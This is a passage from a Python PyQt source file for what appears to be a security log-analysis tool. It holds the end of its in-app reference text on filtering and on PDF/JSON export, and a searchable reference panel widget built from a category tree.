          Source filter : dropdown of log file sources collected in this session

        Keyboard:
          Ctrl+F : focus filter bar
          Escape : clear filter

        Analysis tab findings table:
          Click column header to sort by severity / timestamp / technique
          Double-click a finding row to jump to the originating log entry
          Right-click → Copy Evidence to clipboard
    """)),

    # ── Export & Reports ───────────────────────────────────────────────────
    (["Export & Reports"], "PDF and JSON export", textwrap.dedent("""\
        All exports require an active session with collected logs.

        PDF (reportlab):
          Export > Export Logs as PDF
          Saved to: logs/<session>/exports/<host>_logs_<timestamp>.pdf

        Analysis JSON:
          Export > Export Analysis JSON
          Saved to: logs/<session>/exports/<host>_analysis_<timestamp>.json

        Log JSON:
          Export > Export Logs as JSON
          Saved to: logs/<session>/exports/<host>_logs_<timestamp>.json

        All reports are classified CONFIDENTIAL by default.
        Treat exported files as sensitive engagement artifacts — encrypt at rest.
    """)),
]


def _build_tree_and_map() -> tuple[dict, dict[str, str]]:
    """Build nested category dict and flat key→body map."""
    tree: dict = {}
    content: dict[str, str] = {}
    for categories, title, body in _REF:
        node = tree
        for cat in categories:
            node = node.setdefault(cat, {})
        key = "/".join(categories) + "/" + title
        node[title] = key
        content[key] = body
    return tree, content


class ReferenceTab(QWidget):
    """Searchable in-app reference panel for all commands, scripts, and usage."""

    def __init__(self, parent=None):
        super().__init__(parent)
        self._tree_data, self._content = _build_tree_and_map()
        self._build_ui()
        self._populate_tree("")

    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(8, 8, 8, 8)
        root.setSpacing(6)

        # ── Search bar ───────────────────────────────────────────────────
        top = QHBoxLayout()
        lbl = QLabel("Search:")
        lbl.setStyleSheet("color:#8b949e;")
        top.addWidget(lbl)
        self._search = QLineEdit()
        self._search.setPlaceholderText("Filter topics…")
        self._search.setStyleSheet(
            "background:#161b22;color:#e6edf3;border:1px solid #30363d;"
            "border-radius:4px;padding:4px 8px;"
        )
        self._search.textChanged.connect(self._on_search)
        top.addWidget(self._search)
        self._match_label = QLabel("")
        self._match_label.setStyleSheet("color:#8b949e;font-size:11px;min-width:80px;")
        top.addWidget(self._match_label)
        btn_copy = QPushButton("Copy")
        btn_copy.setStyleSheet(
            "background:#21262d;color:#e6edf3;border:1px solid #30363d;"
            "padding:4px 12px;border-radius:4px;"
        )
        btn_copy.clicked.connect(self._copy_content)
        top.addWidget(btn_copy)
        root.addLayout(top)

        # ── Splitter: tree | content ─────────────────────────────────────
        splitter = QSplitter(Qt.Orientation.Horizontal)

        self._tree = QTreeWidget()
        self._tree.setHeaderHidden(True)
        self._tree.setStyleSheet(
            "QTreeWidget{background:#0d1117;color:#e6edf3;border:1px solid #30363d;}"
            "QTreeWidget::item:selected{background:#1f6feb;}"
            "QTreeWidget::item:hover{background:#21262d;}"
        )
        self._tree.itemClicked.connect(self._on_select)
        splitter.addWidget(self._tree)

        right = QWidget()
        rl = QVBoxLayout(right)
        rl.setContentsMargins(0, 0, 0, 0)
        rl.setSpacing(4)
        self._title_label = QLabel("")
        self._title_label.setFont(QFont("Monospace", 11))
        self._title_label.setStyleSheet(
            "color:#58a6ff;background:#161b22;padding:6px 8px;"
            "border-bottom:1px solid #30363d;"
        )
        rl.addWidget(self._title_label)
        self._content_view = QTextEdit()
        self._content_view.setReadOnly(True)
        self._content_view.setFont(QFont("Monospace", 10))
        self._content_view.setStyleSheet(
            "background:#0d1117;color:#e6edf3;border:none;padding:8px;"
        )
        rl.addWidget(self._content_view)
        splitter.addWidget(right)

        splitter.setSizes([260, 900])
        root.addWidget(splitter)

    # ── Tree population ────────────────────────────────────────────────────

    def _any_child_matches(self, node: dict, text: str) -> bool:
        """Return True if any leaf title in the subtree contains text."""
        for k, v in node.items():
            if isinstance(v, dict):
                if self._any_child_matches(v, text):
                    return True
            else:
                if text in k.lower():
                    return True
        return False

    def _add_node(self, parent, node: dict, text: str) -> int:
        """Recursively add tree items; returns count of visible leaf nodes."""
        count = 0
        for key, value in sorted(node.items()):
            if isinstance(value, dict):
                if text and not self._any_child_matches(value, text):
                    continue
                group_item = QTreeWidgetItem(parent, [f"▸ {key}"])
                group_item.setForeground(0, QColor("#58a6ff"))
                group_item.setExpanded(bool(text))
                count += self._add_node(group_item, value, text)
            else:
                if text and text not in key.lower():
                    continue
                leaf = QTreeWidgetItem(parent, [key])
                leaf.setData(0, Qt.ItemDataRole.UserRole, value)
                count += 1
        return count

    def _populate_tree(self, filter_text: str):
        self._tree.clear()
        text = filter_text.strip().lower()
        count = self._add_node(self._tree, self._tree_data, text)
        if text:
            self._match_label.setText(f"{count} match{'es' if count != 1 else ''}")
        else:
            self._match_label.setText("")
        if not text:
            self._tree.collapseAll()

    # ── Slots ──────────────────────────────────────────────────────────────

    def _on_search(self, text: str):
        self._populate_tree(text)
        if not text:
            self._title_label.setText("")
            self._content_view.clear()

    def _on_select(self, item: QTreeWidgetItem, _col: int):
        key = item.data(0, Qt.ItemDataRole.UserRole)
        if key is None:
            return
        body = self._content.get(key, "")
        title = item.text(0)
        self._title_label.setText(title)
        self._content_view.setPlainText(body)

    def _copy_content(self):
        text = self._content_view.toPlainText()
        if text:
            QApplication.clipboard().setText(text)
